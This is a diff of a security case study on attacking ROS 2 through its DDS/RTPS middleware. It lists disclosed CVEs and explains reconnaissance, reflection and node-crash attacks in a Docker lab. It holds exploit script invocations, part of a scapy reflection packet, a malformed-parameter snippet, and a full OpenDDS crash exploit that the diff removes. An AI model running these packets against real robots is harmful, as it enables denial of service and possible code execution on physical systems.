@@ -4,30 +4,12 @@
 
 The Robot Operating System (ROS) is the de *facto* standard for robot application development [@Quigley09]. It's a framework for creating robot behaviors that comprises various stacks and capabilities for message passing, perception, navigation, manipulation or security, among others. It's [estimated](https://www.businesswire.com/news/home/20190516005135/en/Rise-ROS-55-total-commercial-robots-shipped) that by 2024, 55% of the total commercial robots will be shipping at least one ROS package. **ROS is to roboticists what Linux is to computer scientists**.
 
-This case study will analyze the security of ROS 2[^1] and demonstrate how flaws on both ROS 2 layer or its underlayers lead to the system being compromised.
+This case study will analyze the security of ROS 2[^1] and demonstrate how flaws on both ROS 2  or its underlayers lead to the system being compromised.
 
 [^1]: ROS 2 is the second edition of ROS targeting commercial solutions and including additional capabilities. ROS 2 (Robot Operating System 2) is an open source software development kit for robotics  applications. The purpose of ROS 2 is to offer a standard software platform to developers across industries that will carry them from research and prototyping through to deployment and  production. ROS 2 builds on the success of ROS 1, which is used today in myriad robotics applications  around the world.
 
-The following security flaws are exploited:
 
-| CVE ID | Description | Scope    |  CVSS    | Notes  |
-|--------|-------------|----------|----------|--------|
-| CVE-2021-38445 | OCI OpenDDS versions prior to 3.18.1 do not handle a length parameter consistent with the actual length of the associated data, which may allow an attacker to remotely execute arbitrary code.  | OpenDDS, ROS 2<sub>*</sub> | [7.0](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H) | Failed assertion [>= 3.18.1](https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1) |
-| CVE-2021-38447 | OCI OpenDDS versions prior to 3.18.1 are vulnerable when an attacker sends a specially crafted packet to flood  target devices with unwanted traffic, which may result in a denial-of-service condition.  | OpenDDS, ROS 2<sub>*</sub>   | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H) | Resource exhaustion  [>= 3.18.1](https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1) |
-| CVE-2021-38435 | RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions  3.0.0 and later do not correctly calculate the size when allocating the buffer, which may result in a buffer  overflow | ConnextDDS, ROS 2<sub>*</sub>   | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H) | Segmentation fault via network   [>= 6.1.0](https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071) |
-| CVE-2021-38423 | All versions of GurumDDS improperly calculate the size to be used when allocating the buffer, which may result  in a buffer overflow. | GurumDDS, ROS 2<sub>*</sub>   | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RC:C/CR:M/AR:H) | Segmentation fault via network |
-| CVE-2021-38439 | All versions of GurumDDS are vulnerable to heap-based buffer overflow, which may cause a denial-of-service condition or remotely execute arbitrary code.  | GurumDDS, ROS 2<sub>*</sub> | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RC:C/CR:M/AR:H) | Heap-overflow via network |
-| CVE-2021-38437 | | GurumDDS, ROS 2<sub>*</sub>       | [7.3](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:U/RC:C/CR:M/AR:H) | Unmaintained XML lib. |
-| CVE-2021-38441 | Eclipse CycloneDDS versions prior to 0.8.0 are vulnerable to a write-what-where condition, which may allow an  attacker to write arbitrary values in the XML parser. | CycloneDDS, ROS 2<sub>*</sub>   | [6.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H/E:U/RL:O/RC:C/CR:M/AR:H)     | Heap-write in XML parser |
-| CVE-2021-38443 | Eclipse CycloneDDS versions prior to 0.8.0 improperly handle invalid structures, which may allow an attacker to  write arbitrary values in the XML parser.  | CycloneDDS, ROS 2<sub>*</sub>       | [6.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H/E:U/RL:O/RC:C/CR:M/AR:H)     |8-bytes heap-write in XML parser |
-| CVE-2021-38427 | RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions  3.0.0 and later are vulnerable to a stack-based buffer overflow, which may allow a local attacker to execute  arbitrary code | RTI ConnextDDS, ROS 2<sub>*</sub>  | [6.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H/E:U/RL:O/RC:C/CR:H/AR:H) |Stack overflow in XML parser [>= 6.1.0](https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071) |
-| CVE-2021-38433 | RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions  3.0.0 and later are vulnerable to a stack-based buffer overflow, which may allow a local attacker to execute  arbitrary code. |  RTI ConnextDDS, ROS 2<sub>*</sub>     | [6.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H/E:U/RL:O/RC:C/CR:H/AR:H) | Stack overflow in XML parser [>= 6.1.0](https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071) |
-| CVE-2021-38487 | RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions 3.0.0 and later are vulnerable when an attacker sends a specially crafted packet to flood victims’ devices with  unwanted traffic, which may result in a denial-of-service condition. | ConnextDDS, ROS 2<sub>*</sub>         | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:L/AR:H) | [Mitigation patch in >= 6.1.0](https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071) |
-| CVE-2021-38429 | OCI OpenDDS versions prior to 3.18.1 are vulnerable when an attacker sends a specially crafted packet to flood victims’ devices with unwanted traffic, which may result in a denial-of-service condition. | OpenDDS, ROS 2<sub>*</sub>      |     [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:L/AR:H) | [Mitigation patch in >= 3.18.1](https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1) |
-| CVE-2021-38425 | eProsima Fast-DDS versions prior to 2.4.0 (#2269) are susceptible to exploitation when an attacker sends a  specially crafted packet to flood a target device with unwanted traffic, which may result in a denial-of-service  condition. | eProsima Fast-DDS, ROS 2<sub>*</sub>  | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:T/RC:C/CR:L/AR:H) | [WIP mitigation in master](https://github.com/eProsima/Fast-DDS/issues/2267)     |
-
-
-### Dissecting ROS 2 network interactions
+### Dissecting ROS 2 network interactions through RTPS
 
 To hack ROS 2, we'll be using a network dissector of the underlying default  communication middleware that ROS 2 uses: DDS. DDS stands for Data Distribution Service and is a middleware technology used in critical applications like autonomous driving, industrial and consumer robotics, healthcare machinery or  military tactical systems, among others.
 
@@ -114,7 +96,40 @@ xhost + # (careful with this! use your IP instead if possible)
 docker run -it -v /tmp/.X11-unix:/tmp/.X11-unix -e DISPLAY=$DISPLAY -v $HOME/.Xauthority:/home/xilinx/.Xauthority hacking_ros2:foxy
 ```
 
+\newpage
 ### ROS 2 reconnaissance
+
+ROS 2 uses DDS as the default communication middleware. To locate ROS 2 computational Nodes, one can rely on DDS discovery mechanisms. Here's the body of an arbitrary discovery response obtained from one of the most popular DDS implementations: Cyclone DDS.
+
+```
+0000  52 54 50 53 02 01 01 10 01 10 5C 8E 2C D4 58 47  RTPS......\.,.XG
+0010  FA 5A 30 D3 09 01 08 00 6E 91 76 61 09 C4 5C E5  .Z0.....n.va..\.
+0020  15 05 F8 00 00 00 10 00 00 00 00 00 00 01 00 C2  ................
+0030  00 00 00 00 01 00 00 00 00 03 00 00 2C 00 1C 00  ............,...
+0040  17 00 00 00 44 44 53 50 65 72 66 3A 30 3A 35 38  ....DDSPerf:0:58
+0050  3A 74 65 73 74 2E 6C 6F 63 61 6C 00 15 00 04 00  :test.local.....
+0060  02 01 00 00 16 00 04 00 01 10 00 00 02 00 08 00  ................
+0070  00 00 00 00 38 89 41 00 50 00 10 00 01 10 5C 8E  ....8.A.P.....\.
+0080  2C D4 58 47 FA 5A 30 D3 00 00 01 C1 58 00 04 00  ,.XG.Z0.....X...
+0090  00 00 00 00 0F 00 04 00 00 00 00 00 31 00 18 00  ............1...
+00a0  01 00 00 00 6A 7A 00 00 00 00 00 00 00 00 00 00  ....jz..........
+00b0  00 00 00 00 C0 A8 01 55 32 00 18 00 01 00 00 00  .......U2.......
+00c0  6A 7A 00 00 00 00 00 00 00 00 00 00 00 00 00 00  jz..............
+00d0  C0 A8 01 55 07 80 38 00 00 00 00 00 2C 00 00 00  ...U..8.....,...
+00e0  00 00 00 00 00 00 00 00 00 00 00 00 1D 00 00 00  ................
+00f0  74 65 73 74 2E 6C 6F 63 61 6C 2F 30 2E 39 2E 30  test.local/0.9.0
+0100  2F 4C 69 6E 75 78 2F 4C 69 6E 75 78 00 00 00 00  /Linux/Linux....
+0110  19 80 04 00 00 80 06 00 01 00 00 00              ............
+```
+
+Using the RTPS dissector, we're can craft discovery requests and send them to targeted machines, processing the response and determining if any DDS participant is active within that machine and DOMAIN_ID.
+
+Let's craft a package as follows and send it to the dockerized target we built before:
+
+![](../../images/2021/footprinting.png)
+
+![A simple empty RTPS package](images/2021/footprinting.pdf)
+
 
 ```bash
 ## terminal 1 - ROS 2 Node
@@ -124,26 +139,23 @@ docker run -it --net=host hacking_ros2:foxy -c "source /opt/opendds_ws/install/s
 python3 exploits/footprint.py 2> /dev/null
 ```
 
+Though DDS implementations comply with [OMG's DDS's specification](https://www.omg.org/spec/DDS), discovery responses vary among implementations. The following recording shows how while the crafted package allows to determine the presence of ROS 2 Nodes running (Galactic-default) CycloneDDS implementation, when changed to Fast-DDS (another DDS implementation, previously called FastRTPS and the default one in Foxy), no responses to the discovery message are received.
+
+[![ROS 2 reconnaissance PoC](https://asciinema.org/a/K1IBM7ojOKlw89XhP9FJUXGYV.svg)](https://asciinema.org/a/K1IBM7ojOKlw89XhP9FJUXGYV)
 
 
+\newpage
 ### ROS 2 reflection attack
 
-Let's try this out in the dockerized environment using byobu to facilitate the setup:
+[![ROS 2 reflection attack](https://asciinema.org/a/450475.svg)](https://asciinema.org/a/450475)
 
-```bash
-## terminal 1 - ROS 2 Node
-# Launch container
-docker run -it hacking_ros2:foxy /bin/bash
+Each RTPS package `RTPSSubMessage_DATA` submessage can have multiple parameters. One of such parameters is `PID_METATRAFFIC_MULTICAST_LOCATOR`. Defined on [OMG's RTPS spec](https://www.omg.org/spec/DDSI-RTPS/2.5/PDF), it allows to hint which address should be used for multicast interactions. Unfortunately, there's no whitelisting of which IPs are to be included in here and all implementations allow for arbitrary IPs in this field. By modifying this value through a package, an attacker could hint a ROS 2 Node (through its underlying DDS implementation) to use a new multicast IP address (e.g. a malicious server that generates continuous traffic and responses to overload the stack and generate unwanted traffic) which can be used to trigger reflection (or amplification) attacks.
 
-# (inside of the container), launch configuration
-byobu -f configs/ros2_reflection.conf attach
+![](../../images/2021/ros2_crasher.png)
 
-## terminal 1 - attacker
-# Launch the exploit
-sudo python3 exploits/reflection.py 2> /dev/null
-```
+![An RTPS package with an incorrect parameterLength](images/2021/ros2_crasher.pdf)
 
-#### Looking at the exploit
+Here's an example of such package crafted with our dissector:
 
 ```python
 from scapy.all import *
@@ -294,8 +306,18 @@ package = (
 send(package)
 ```
 
+Fully avoiding this flaw requires a DDS implementation to break with the standard specification (which is not acceptable by various vendors because they profit from the interoperability the complying with the standard provides). Partial mitigations have appeared which implement exponential decay strategies for traffic amplification, making its exploitation more challenging.
 
-### ROS 2 Node crashing
+This security issue affected all **DDS implementations** and as a result, all ROS 2 Nodes that build on top of DDS. As part of this research, various CVE IDs were filed:
+
+| CVE ID | Description | Scope    |  CVSS    | Notes  |
+|--------|-------------|----------|----------|--------|
+| CVE-2021-38487 | RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions 3.0.0 and later are vulnerable when an attacker sends a specially crafted packet to flood victims’ devices with  unwanted traffic, which may result in a denial-of-service condition. | ConnextDDS, ROS 2<sub>*</sub>         | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:L/AR:H) | [Mitigation patch in >= 6.1.0](https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071) |
+| CVE-2021-38429 | OCI OpenDDS versions prior to 3.18.1 are vulnerable when an attacker sends a specially crafted packet to flood victims’ devices with unwanted traffic, which may result in a denial-of-service condition. | OpenDDS, ROS 2<sub>*</sub>      |     [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:L/AR:H) | [Mitigation patch in >= 3.18.1](https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1) |
+| CVE-2021-38425 | eProsima Fast-DDS versions prior to 2.4.0 (#2269) are susceptible to exploitation when an attacker sends a  specially crafted packet to flood a target device with unwanted traffic, which may result in a denial-of-service  condition. | eProsima Fast-DDS, ROS 2<sub>*</sub>  | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:T/RC:C/CR:L/AR:H) | [WIP mitigation in master](https://github.com/eProsima/Fast-DDS/issues/2267)     |
+
+
+#### Trying it out:
 
 Let's try this out in the dockerized environment using byobu to facilitate the setup:
 
@@ -304,87 +326,54 @@ Let's try this out in the dockerized environment using byobu to facilitate the s
 # Launch container
 docker run -it hacking_ros2:foxy /bin/bash
 
-# (inside of the container), launch conriguration
-byobu -f configs/ros2_crash.conf attach
+# (inside of the container), launch configuration
+byobu -f configs/ros2_reflection.conf attach
 
 ## terminal 1 - attacker
+# Launch the exploit
+sudo python3 exploits/reflection.py 2> /dev/null
+```
+
+
+\newpage
+### ROS 2 Node crashing
+
+Fuzz testing often helps find funny flaws due to programming errors in the corresponding implementations. The following two were found while doing fuzz testing in a white-boxed manner (with access to the source code):
+
+| CVE ID | Description | Scope    |  CVSS    | Notes  |
+|--------|-------------|----------|----------|--------|
+| CVE-2021-38447 | OCI OpenDDS versions prior to 3.18.1 are vulnerable when an attacker sends a specially crafted packet to flood  target devices with unwanted traffic, which may result in a denial-of-service condition.  | OpenDDS, ROS 2<sub>*</sub>   | [8.6](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H) | Resource exhaustion  [>= 3.18.1](https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1) |
+| CVE-2021-38445 | OCI OpenDDS versions prior to 3.18.1 do not handle a length parameter consistent with the actual length of the associated data, which may allow an attacker to remotely execute arbitrary code.  | OpenDDS, ROS 2<sub>*</sub> | [7.0](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H) | Failed assertion [>= 3.18.1](https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1) |
+
+They both affected OpenDDS. Let's try out [CVE-2021-38445](https://nvd.nist.gov/vuln/detail/CVE-2021-38445) which leads ROS 2 Nodes to either crash or execute arbitrary code due to DDS not handling properly the length of the `PID_BUILTIN_ENDPOINT_QOS` parameter within RTPS's `RTPSSubMessage_DATA` submessage. We'll reproduce this in the dockerized environment using byobu to facilitate the setup:
+
+```bash
+## terminal 1 - ROS 2 Node
+# Launch container
+docker run -it hacking_ros2:foxy -c "byobu -f configs/ros2_crash.conf attach"
+# docker run -it --privileged --net=host hacking_ros2:foxy -c "byobu -f configs/ros2_crash.conf attach"
+
+## terminal 2 - attacker
 # Launch the exploit
 sudo python3 exploits/crash.py 2> /dev/null
 ```
 
-#### Looking at the exploit
+[![ROS 2 Node crashing](https://asciinema.org/a/450474.svg)](https://asciinema.org/a/450474)
 
-```python
-"""
-A simple python script to crash ROS 2 communication on top of OpenDDS
-"""
+The key aspect in here is the `parameterLength` value:
 
-from scapy.all import *
-from scapy.layers.inet import UDP, IP
-from scapy.contrib.rtps import *
+![](../../images/2021/ros2_crasher.png)
 
-bind_layers(UDP, RTPS)
-conf.verb = 0
+![An RTPS package with an incorrect parameterLength](images/2021/ros2_crasher.pdf)
 
 
-dst = "172.17.0.2"
-sport = 17900
-dport = 7410
-
-# # crash OpenDDS publisher prior to v3.18
-opendds_crasher = (
-    IP(
-        version=4,
-        ihl=5,
-        tos=0,
-        len=82,
-        flags=2,
-        frag=0,
-        ttl=64,
-        proto=17,
-        dst=dst,
-    )
-    / UDP(sport=sport, dport=dport, len=62)
-    / RTPS(
-        protocolVersion=ProtocolVersionPacket(major=2, minor=4),
-        vendorId=VendorIdPacket(vendor_id=b"\x01\x03"),
-        guidPrefix=GUIDPrefixPacket(
-            hostId=16974402, appId=2886795266, instanceId=1172693757
-        ),
-        magic=b"RTPS",
-    )
-    / RTPSMessage(
-        submessages=[
-            RTPSSubMessage_DATA(
-                submessageId=21,
-                submessageFlags=5,
-                octetsToNextHeader=0,
-                extraFlags=0,
-                octetsToInlineQoS=16,
-                readerEntityIdKey=0,
-                readerEntityIdKind=0,
-                writerEntityIdKey=256,
-                writerEntityIdKind=194,
-                writerSeqNumHi=0,
-                writerSeqNumLow=2,
-                data=DataPacket(
-                    encapsulationKind=3,
-                    encapsulationOptions=0,
-                    parameterList=ParameterListPacket(
-                        parameterValues=[
-                            PID_BUILTIN_ENDPOINT_QOS(
-                                parameterId=119, parameterLength=0, parameterData=b""
-                            ),
-                            PID_PAD(parameterId=b"\x00\x00"),
-                        ]
-                    ),
-                ),
-            )
-        ]
-    )
-)
+```bash
+PID_BUILTIN_ENDPOINT_QOS(
+                  parameterId=119,
+                  parameterLength=0,
+                  parameterData=b"\x00\x00\x00\x00",
+              ),
 ```
-
 
 #### Looking deeper into the crash issue
 
